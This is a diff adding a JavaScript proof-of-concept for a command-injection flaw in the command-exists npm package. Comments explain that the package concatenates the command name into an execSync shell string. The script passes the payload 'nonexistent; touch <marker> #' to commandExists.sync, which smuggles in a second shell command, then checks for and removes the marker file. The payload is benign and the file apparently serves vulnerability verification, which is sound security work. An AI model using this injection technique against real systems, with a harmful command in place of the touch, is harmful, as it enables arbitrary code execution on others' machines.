@@ -1,0 +1,34 @@
+```javascript
+'use strict';
+
+const commandExists = require('command-exists');
+const fs = require('fs');
+const os = require('os');
+const path = require('path');
+
+// The vulnerable sink lives in commandExistsUnixSync (command-exists.js),
+// where user-controlled `commandName` is concatenated directly into a shell
+// string passed to execSync(), with the result captured in the `stdout`
+// variable. No sanitization is performed, so shell metacharacters in
+// `commandName` let an attacker run arbitrary commands.
+
+const marker = path.join(os.tmpdir(), 'pwned_' + Date.now() + '.txt');
+
+// Malicious "command name" breaks out of the intended `command -v <name>`
+// invocation and runs an arbitrary command instead.
+const payload = `nonexistent; touch ${marker} #`;
+
+try {
+  const found = commandExists.sync(payload);
+  console.log('commandExists.sync returned:', found);
+} catch (e) {
+  console.log('commandExists.sync threw:', e.message);
+}
+
+if (fs.existsSync(marker)) {
+  console.log('VULNERABLE: arbitrary command executed, marker file created at', marker);
+  fs.unlinkSync(marker);
+} else {
+  console.log('Marker file not created; exploit may not have triggered.');
+}
+```
